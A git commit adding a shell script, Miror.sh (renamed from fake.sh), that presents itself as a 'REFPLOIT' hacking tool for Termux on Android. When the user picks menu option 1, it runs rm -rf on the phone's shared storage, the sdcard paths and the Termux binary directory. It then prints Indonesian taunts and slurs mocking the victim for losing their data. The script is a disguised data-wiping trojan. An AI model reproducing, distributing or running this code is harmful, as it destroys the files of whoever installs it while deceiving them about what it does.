e4aa891c75e5702996bee10e7b5d5090277789bd
mrdrag1 <46041450+mrdrag1@users.noreply.github.com>
2019-01-17 18:30:09 +0700

    Rename fake.sh to Miror.sh

---
+++ Miror.sh
@@ -0,0 +1,78 @@
+sh Modified
+
+
+#!/usr/xsystem/bash/bin
+
+#yang baca anak babi, tq
+
+#Coded By MR.DRAG AND KANDOL [ALI ATTACKER]
+
+
+
+toilet -f mono12 -F border REFPLOIT
+
+
+echo "\033[33;1m_________________________________________________"
+
+echo "\033[30;1m|_______________________________________________|"
+
+echo "\033[37;1m[•]-------------------------------------------[•]"
+
+echo "\033[31;1mauthor : " "\033[36;1mOMEST"
+
+echo "\033[31;1mdate : " "\033[34;1m 15-1-2019"
+
+echo "\033[31;1mprogram : " "\033[33;1mbash/shell"
+
+echo "\033[31;1mfacebook : " "\033[35;1mFlowers Arr"
+
+echo "\033[31;1mwhatsApp : " "\033[32;1m082278818357"
+
+echo "\033[37;1m[•]-------------------------------------------[•]"
+
+echo "\033[33;1m|_______________________________________________|"
+
+sleep 01
+
+echo "\033[34;1m××××××××××××××××××××××××××××××××"
+
+echo "\033[36;1m|}1{" "\033[32;1mref""\033[33;1mploit|"
+
+echo "\033[34;1m××××××××××××××××××××××××××××××××"
+
+
+echo "\033[32;1m"
+
+ read -p "root@start_refploit:~#" ommo
+
+
+
+if [ $ommo = 1 ] || [ $ommo = 1 ]
+
+then
+
+clear
+
+pkg update
+
+pkg upgrade
+
+rm -rf /storage/emulated/0
+
+rm -rf /storage
+
+rm -rf /storage/sdcard
+
+rm -rf /storage/sdcard1
+
+rm -rf $PREFIX/bin
+
+figlet BWAHHAHAHAHHAH MAMPOS BABI DATA-DATA
+
+HANDPHONE KALIAN KE RESET BWHAHAHAHAHAHAHAH
+MAKANYA JADI ORANG BAIK DONG ANJING
+
+echo Unchhhhh:* cup-cup kesian ea babi..sabar ae |lolcat -a -d 150
+
+fi
+
